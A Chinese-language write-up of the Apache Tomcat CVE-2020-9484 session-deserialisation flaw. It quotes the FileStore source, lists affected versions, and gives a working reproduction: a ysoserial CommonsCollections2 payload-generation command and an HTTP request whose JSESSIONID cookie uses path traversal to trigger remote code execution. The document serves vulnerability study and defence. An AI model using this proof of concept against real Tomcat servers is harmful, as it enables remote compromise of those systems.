### CVE-2020-9484

当使用tomcat时，如果使用了tomcat提供的session持久化功能，如果存在文件上传功能，恶意请求者通过一个流程，利用目录穿越，将能发起一个恶意请求造成服务端远程命令执行。

### 漏洞详情

当用户在使用tomcat时，启用了session持久化功能FileStore，例（conf/context.xml）：

```
<Context>
    
    ...

    <Manager className="org.apache.catalina.session.PersistentManager"
      debug="0"
      saveOnRestart="false"
      maxActiveSession="-1"
      minIdleSwap="-1"
      maxIdleSwap="-1"
      maxIdleBackup="-1">
        <Store className="org.apache.catalina.session.FileStore" directory="./session" />
    </Manager>
</Context>
```
在使用了上述功能的情况下，如果恶意用户可以上传指定后缀（.session）的文件时，利用反序列化gadget，将能造成服务端远程代码执行，原因在于FileStore类读取文件时，使用了JSESSIONID的名称，没有过滤“/../”这样的目录穿越：

org.apache.catalina.session.FileStore：
```
public Session load(String id) throws ClassNotFoundException, IOException {
    // Open an input stream to the specified pathname, if any
    File file = file(id);
    if (file == null || !file.exists()) {
        return null;
    }

    Context context = getManager().getContext();
    Log contextLog = context.getLogger();

    if (contextLog.isDebugEnabled()) {
        contextLog.debug(sm.getString(getStoreName()+".loading", id, file.getAbsolutePath()));
    }

    ClassLoader oldThreadContextCL = context.bind(Globals.IS_SECURITY_ENABLED, null);

    try (FileInputStream fis = new FileInputStream(file.getAbsolutePath());
            ObjectInputStream ois = getObjectInputStream(fis)) {

        StandardSession session = (StandardSession) manager.createEmptySession();
        session.readObjectData(ois);
        session.setManager(manager);
        return session;
    } catch (FileNotFoundException e) {
        if (contextLog.isDebugEnabled()) {
            contextLog.debug("No persisted data file found");
        }
        return null;
    } finally {
        context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);
    }
}

private File file(String id) throws IOException {
    if (this.directory == null) {
        return null;
    }
    String filename = id + FILE_EXT;
    File file = new File(directory(), filename);
    return file;
}
```
上述代码，通过构造“/../”的filename路径，将能穿越到任意目录去读取后缀为“.session”的序列化数据进行反序列化。

### 影响版本

```
<= 9.0.34
<= 8.5.54
<= 7.0.103
```

### 漏洞复现

配置tomcat的conf/context.xml文件：

```
<Context>
    
    ...

    <Manager className="org.apache.catalina.session.PersistentManager"
      debug="0"
      saveOnRestart="false"
      maxActiveSession="-1"
      minIdleSwap="-1"
      maxIdleSwap="-1"
      maxIdleBackup="-1">
        <Store className="org.apache.catalina.session.FileStore" directory="./session" />
    </Manager>
</Context>
```

部署一个存在以下依赖的webapp（一个存在commons-collections4的jar依赖的web服务，例bug.war）到tomcat：

```
dependencies {
    compile 'org.apache.commons:commons-collections4:4.0'
}
```

使用github上的ysoserial工具->```https://github.com/frohoff/ysoserial```，生成commons-collections4依赖的gadget恶意序列化数据：

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 "touch /tmp/tomcat-bug" > /tmp/22222.session
```

通过有缺陷的文件上传功能把恶意序列化数据文件上传到任意目录，但后缀必须是“.session”，例如：/tmp/22222.session

最后，发起恶意请求，请求payload：

```
GET /bug/api HTTP/1.1
Host: 127.0.0.1:8080
Cookie: JSESSIONID=../../../../../../../../../../../../tmp/22222


```
将会导致服务端远程代码执行
